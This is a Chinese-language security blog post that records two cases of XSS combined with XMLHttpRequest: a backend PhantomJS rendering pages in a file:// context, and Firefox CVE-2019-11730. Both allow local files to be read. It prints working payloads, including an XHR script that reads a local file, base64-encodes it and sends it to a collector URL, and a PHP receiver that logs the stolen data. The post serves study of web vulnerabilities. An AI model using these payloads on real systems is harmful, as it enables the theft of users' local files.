---
title: XSS + XHR 两个案例的记录
date: April 4th 2020
tags: [Web安全, XSS, XHR, LFI]
summary: 记录两个有趣的 XSS 案例：通过 XMLHttpRequest 跨域读取数据，以及 XSS 结合本地文件包含（LFI）构成的漏洞攻击链。
---

# XSS + XHR 两个案例的记录

![images](https://bbs.d0g3.cn/assets/files/2020-04-03/1585900956-669534-tim20200403160212.png)

最近在总结XSS相关的内容，记录一下最近看到的两个比较有趣的案例。

## 案例

### 案例一、后端 PhantomJS 导致的文件读取

参考： [https://xz.aliyun.com/t/127](https://xz.aliyun.com/t/127)

利用过程：

1. 后端使用PhantomJS来生成页面，生成好了会截图。(上下文为file://)
2. 业务存在一个xss
3. 通过XHR读取本地文件

### 案例二、CVE-2019-11730 导致的文件读取

参考：[CVE-2019-11730 分析&小谈](https://hpdoger.cn/2020/03/17/title:%20CVE-2019-11730%20%E5%88%86%E6%9E%90&%E5%B0%8F%E8%B0%88/)

当用户把带有payload的页面保存到本地并用漏洞对于的firefox打开，就可以读取本地的任意文件。

- 漏洞对应的firefox版本：https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-11730
- 下载指定版本的firefox：http://ftp.mozilla.org/pub/firefox/releases/

## 利用

获取上下文环境：

```html
<svg/onload="document.write(window.location)">
```

案例一中，本身是同源的，所以可以使用iframe直接读取本地文件

```html
<iframe src=file:///C:/Users/ThreeZhi/Desktop/test.txt></iframe>
```

简单读取文件：

```html
<script>
    function reqListener () {
        var b64 = btoa(this.responseText);
        var request = new XMLHttpRequest();
        request.open('GET', 'http://127.0.0.1/getfile.php?file='+b64, true);
        request.send();
    } 
    var oReq = new XMLHttpRequest(); 
    oReq.addEventListener("load", reqListener); 
    oReq.open("GET", "file:///C:/Users/ThreeZhi/Desktop/test.txt"); 
    oReq.send();
 </script>
```

接收文件 (要设置CORS头)

```php
<?php
    header("Access-Control-Allow-Origin: *");
    $file = $_GET['file'];
    $fp = fopen('file.txt', 'a+');
    fwrite($fp, $file."\r\n\r\n");
    fclose($fp);
?>
```

比较完善的payload：[https://github.com/alidnf/CVE-2019-11730/blob/master/poc.html](https://github.com/alidnf/CVE-2019-11730/blob/master/poc.html)